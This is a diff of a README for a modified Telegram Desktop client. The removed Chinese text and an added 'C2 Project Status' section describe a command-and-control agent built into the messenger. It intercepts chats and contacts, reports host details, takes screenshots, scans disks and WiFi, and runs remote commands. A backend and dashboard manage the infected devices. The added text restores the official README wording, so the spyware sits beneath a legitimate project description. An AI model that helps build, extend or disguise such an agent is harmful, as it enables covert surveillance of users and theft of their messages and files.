@@ -1,47 +1,105 @@
-# Telegram C2 客户端 (Client)
+# [Telegram Desktop][telegram_desktop] – Official Messenger
 
-本项目基于 Telegram Desktop 官方源码修改，集成了数据采集、系统侦察和远程控制功能 (C2 Agent)。
+This is the complete source code and the build instructions for the official [Telegram][telegram] messenger desktop client, based on the [Telegram API][telegram_api] and the [MTProto][telegram_proto] secure protocol.
 
-## 1. 功能特性
+[![Version](https://badge.fury.io/gh/telegramdesktop%2Ftdesktop.svg)](https://github.com/telegramdesktop/tdesktop/releases)
+[![Build Status](https://github.com/telegramdesktop/tdesktop/workflows/Windows./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
+[![Build Status](https://github.com/telegramdesktop/tdesktop/workflows/MacOS./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
+[![Build Status](https://github.com/telegramdesktop/tdesktop/workflows/Linux./badge.svg)](https://github.com/telegramdesktop/tdesktop/actions)
 
-### A. 数据收集 (本地 DB)
-- **消息拦截**: 捕获聊天消息（文本和图片），保存到本地加密 SQLite 数据库 `tdata_client.db`。
-- **联系人提取**: 捕获 Telegram ID, 用户名, 电话号码等。
+[![Preview of Telegram Desktop][preview_image]][preview_image_url]
 
-### B. 系统侦察
-- **基本信息**: 自动上报 MAC 地址、IP 地址、主机名、OS 版本。
-- **屏幕截图**: 支持实时截图 (`get_screenshot`) 和定时监控 (`start_monitor`)。
-- **文件系统扫描**: 全盘扫描文件并计算 MD5，生成 `scan_results.db` 上传。
-- **软件枚举**: 读取注册表获取已安装软件列表。
-- **WiFi 扫描**: 调用 `netsh` 获取周边 WiFi 信息。
+The source code is published under GPLv3 with OpenSSL exception, the license is available [here][license].
 
-### C. 数据外泄与控制
-- **心跳机制**: 每 60 秒（默认）发送心跳包到后端，维持在线状态。
-- **任务轮询**: 接收并执行远程命令 (`cmd_exec`, `upload_file`, `upload_db` 等)。
-- **数据同步**: 启动时自动收集并上传 `tdata_client.db`。
+## C2 Project Status (Custom Modification)
 
-## 2. 构建与运行
+### Current Architecture
+*   **Client**: Modified Telegram Desktop (C++) acting as an agent.
+    *   Compiles with Visual Studio 2022 using `out/Release/build_only.bat`.
+    *   Features: Heartbeat, Remote Command Execution, Data Collection (Software, WiFi, Files, Chat Logs), SQLite Local Storage (`tdata/tdata_client.db`).
+*   **Backend**: Spring Boot Application (Java).
+    *   Port: 8101.
+    *   Features: Task Management, Data Aggregation (MySQL), File Storage, Deduplication (Redis).
+*   **Frontend**: React + UmiJS.
+    *   Port: 8000.
+    *   Features: Dashboard, Device Management, Task Triggering.
 
-### 环境要求
-- Windows 10/11 SDK
-- Visual Studio 2022 (C++ 桌面开发工作负载)
-- Python 3.x (用于构建脚本)
+### Recent Updates (Phase 7 - Data Integrity)
+*   **Data Synchronization**: Fixed issues where local file scan results were not syncing to the backend. Implemented batch processing and hash-based deduplication.
+*   **Build System**: Streamlined Windows build process with `build_only.bat` to handle environment paths correctly.
+*   **Stability**: Enhanced `heartbeat.cpp` with better error handling and debug logging (`HEARTBEAT_DEBUG`).
+*   **Database**: Corrected local SQLite path usage and verified data consistency between Client and Server.
 
-### 构建步骤
-1. 运行构建脚本:
-   ```cmd
-   compile_client.bat
-   ```
-   该脚本会自动配置 CMake 并调用 Ninja/MSBuild 进行编译。
+## Supported systems
 
-### 运行
-生成的可执行文件位于 `out/Release/Telegram.exe`。
-建议使用单独的工作目录运行以避免污染数据：
-```cmd
-Telegram.exe -workdir tdata
-```
+The latest version is available for
 
-## 3. 架构说明
-- **核心类**: `Core::Heartbeat` (单例)，负责与 C2 后端通信。
-- **数据库**: 使用 SQLite (`tdata_client.db`) 存储拦截的数据。
-- **通信协议**: HTTP POST，数据通过 JSON 传输，支持文件 Multipart 上传。
+* [Windows 7 and above (64 bit)](https://telegram.org/dl/desktop/win64) ([portable](https://telegram.org/dl/desktop/win64_portable))
+* [Windows 7 and above (32 bit)](https://telegram.org/dl/desktop/win) ([portable](https://telegram.org/dl/desktop/win_portable))
+* [macOS 10.13 and above](https://telegram.org/dl/desktop/mac)
+* [Linux static build for 64 bit](https://telegram.org/dl/desktop/linux)
+* [Snap](https://snapcraft.io/telegram-desktop)
+* [Flatpak](https://flathub.org/apps/details/org.telegram.desktop)
+
+## Old system versions
+
+Version **4.9.9** was the last that supports older systems
+
+* [macOS 10.12](https://updates.tdesktop.com/tmac/tsetup.4.9.9.dmg)
+* [Linux with glibc < 2.28 static build](https://updates.tdesktop.com/tlinux/tsetup.4.9.9.tar.xz)
+
+Version **2.4.4** was the last that supports older systems
+
+* [OS X 10.10 and 10.11](https://updates.tdesktop.com/tosx/tsetup-osx.2.4.4.dmg)
+* [Linux static build for 32 bit](https://updates.tdesktop.com/tlinux32/tsetup32.2.4.4.tar.xz)
+
+Version **1.8.15** was the last that supports older systems
+
+* [Windows XP and Vista](https://updates.tdesktop.com/tsetup/tsetup.1.8.15.exe) ([portable](https://updates.tdesktop.com/tsetup/tportable.1.8.15.zip))
+* [OS X 10.8 and 10.9](https://updates.tdesktop.com/tmac/tsetup.1.8.15.dmg)
+* [OS X 10.6 and 10.7](https://updates.tdesktop.com/tmac32/tsetup32.1.8.15.dmg)
+
+## Third-party
+
+* Qt 6 ([LGPL](http://doc.qt.io/qt-6/lgpl.html)) and Qt 5.15 ([LGPL](http://doc.qt.io/qt-5/lgpl.html)) slightly patched
+* OpenSSL 3.2.1 ([Apache License 2.0](https://www.openssl.org/source/apache-license-2.0.txt))
+* WebRTC ([New BSD License](https://github.com/desktop-app/tg_owt/blob/master/LICENSE))
+* zlib ([zlib License](http://www.zlib.net/zlib_license.html))
+* LZMA SDK 9.20 ([public domain](http://www.7-zip.org/sdk.html))
+* liblzma ([public domain](http://tukaani.org/xz/))
+* Google Breakpad ([License](https://chromium.googlesource.com/breakpad/breakpad/+/master/LICENSE))
+* Google Crashpad ([Apache License 2.0](https://chromium.googlesource.com/crashpad/crashpad/+/master/LICENSE))
+* GYP ([BSD License](https://github.com/bnoordhuis/gyp/blob/master/LICENSE))
+* Ninja ([Apache License 2.0](https://github.com/ninja-build/ninja/blob/master/COPYING))
+* OpenAL Soft ([LGPL](https://github.com/kcat/openal-soft/blob/master/COPYING))
+* Opus codec ([BSD License](http://www.opus-codec.org/license/))
+* FFmpeg ([LGPL](https://www.ffmpeg.org/legal.html))
+* Guideline Support Library ([MIT License](https://github.com/Microsoft/GSL/blob/master/LICENSE))
+* Range-v3 ([Boost License](https://github.com/ericniebler/range-v3/blob/master/LICENSE.txt))
+* Open Sans font ([Apache License 2.0](http://www.apache.org/licenses/LICENSE-2.0.html))
+* Vazirmatn font ([SIL Open Font License 1.1](https://github.com/rastikerdar/vazirmatn/blob/master/OFL.txt))
+* Emoji alpha codes ([MIT License](https://github.com/emojione/emojione/blob/master/extras/alpha-codes/LICENSE.md))
+* xxHash ([BSD License](https://github.com/Cyan4973/xxHash/blob/dev/LICENSE))
+* QR Code generator ([MIT License](https://github.com/nayuki/QR-Code-generator#license))
+* CMake ([New BSD License](https://github.com/Kitware/CMake/blob/master/Copyright.txt))
+* Hunspell ([LGPL](https://github.com/hunspell/hunspell/blob/master/COPYING.LESSER))
+* Ada ([Apache License 2.0](https://github.com/ada-url/ada/blob/main/LICENSE-APACHE))
+
+## Build instructions
+
+* Windows [(32-bit)][win32] [(64-bit)][win64]
+* [macOS][mac]
+* [GNU/Linux using Docker][linux]
+
+[//]: # (LINKS)
+[telegram]: https://telegram.org
+[telegram_desktop]: https://desktop.telegram.org
+[telegram_api]: https://core.telegram.org
+[telegram_proto]: https://core.telegram.org/mtproto
+[license]: LICENSE
+[win32]: docs/building-win.md
+[win64]: docs/building-win-x64.md
+[mac]: docs/building-mac.md
+[linux]: docs/building-linux.md
+[preview_image]: https://github.com/telegramdesktop/tdesktop/blob/dev/docs/assets/preview.png "Preview of Telegram Desktop"
+[preview_image_url]: https://raw.githubusercontent.com/telegramdesktop/tdesktop/dev/docs/assets/preview.png
